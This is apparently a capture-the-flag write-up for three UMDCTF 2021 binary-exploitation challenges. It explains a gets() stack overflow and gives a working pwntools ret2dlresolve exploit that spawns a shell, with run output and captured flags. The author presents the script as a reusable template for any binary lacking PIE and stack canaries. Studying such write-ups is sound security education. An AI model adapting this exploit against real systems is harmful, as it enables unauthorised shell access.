# UMDCTF 2021

## Jump Is Easy/Jump Not Easy/Jump Is Found

> Jumping is easy. Where do we want to jump to is the hard part.
>
> `nc chals6.umdctf.io 7001`
>
> author: WittsEnd2
>
> score: 1/10
>
> [jie](jie)
> 
> What happened? This new adventure is not as easy as the first one?
>
> `nc chals6.umdctf.io 7003`
>
> author: WittsEnd2
>
> score: 2/10
>
> [jne](jne)
> 
> We are trying to jump somewhere, but nothing is happening. Can you figure out what is going on?
>
> `nc chals6.umdctf.io 7004`
>
> author: WittsEnd2
>
> score: 3/10
>
> [jnw](jnw)

Tags: _pwn_ _x86-64_ _ret2dlresolve_ _bof_


## Summary

I'm lumping all of these together since I used the exact same code on all of them.  And I'm sure this was _not_ the intended solution.

I'm not going to cover all the internals or details of ret2dlresolve (in this write up, I'm working on a future article), however here are two good reads:

[https://syst3mfailure.io/ret2dl_resolve](https://syst3mfailure.io/ret2dl_resolve)  
[https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62](https://gist.github.com/ricardo2197/8c7f6f5b8950ed6771c1cd3a116f7e62)


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    Stack:    No canary found
    PIE:      No PIE (0x400000)
```

All three had at least the above--all that is needed for easy ret2dlresolve with `gets`.


### Decompile with Ghidra

```c
undefined8 jump(void)
{
  char local_48 [64];
  
  puts("Where do you want to go?");
  gets(local_48);
  return 0xffffffff;
}
```

Yep, `gets`.  All three of them.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./jnw')

rop = ROP(binary)
ret = rop.find_gadget(['ret'])[0]

dl = Ret2dlresolvePayload(binary, symbol='system', args=['sh'])

rop.raw(ret)
rop.gets(dl.data_addr)
rop.ret2dlresolve(dl)

if args.REMOTE:
    p = remote('chals5.umdctf.io', 7004)
else:
    p = process(binary.path)

payload  = b''
payload += 0x48 * b'A'
payload += rop.chain()
payload += b'\n'
payload += dl.payload

p.sendline(payload)
p.interactive()
```

Alright script-kiddies, take this, change the binary, change the stack frame offset (`0x48`) for the `gets` buffer, change the `remote`, and as long as no PIE and no canary, you'll pwn the box.


Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/umdctf2021/jie/jie'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[*] Loading gadgets for '/pwd/datajerk/umdctf2021/jie/jie'
[+] Opening connection to chals5.umdctf.io on port 7001: Done
[*] Switching to interactive mode
Welcome to the space shuttle! Get ready for an adventure!
Where do you want to go?
$ cat flag
UMDCTF-{Sh311c0d3_1s_The_B35T_p14c3_70_jump_70}

# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/umdctf2021/jne/jne'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loading gadgets for '/pwd/datajerk/umdctf2021/jne/jne'
[+] Opening connection to chals5.umdctf.io on port 7003: Done
[*] Switching to interactive mode
Welcome to the space shuttle! Get ready for an adventure!
Where do you want to go?
$ cat flag
UMDCTF-{wh323_423_WE_G01n9_n3xt?}

# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/umdctf2021/jnw/jnw'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './jnw'
[+] Opening connection to chals5.umdctf.io on port 7004: Done
[*] Switching to interactive mode
Welcome to the space shuttle! Get ready for an adventure!
Where do you want to go?
$ cat flag
UMDCTF-{JuMp_1s_N0w_w0RK1nG}
```
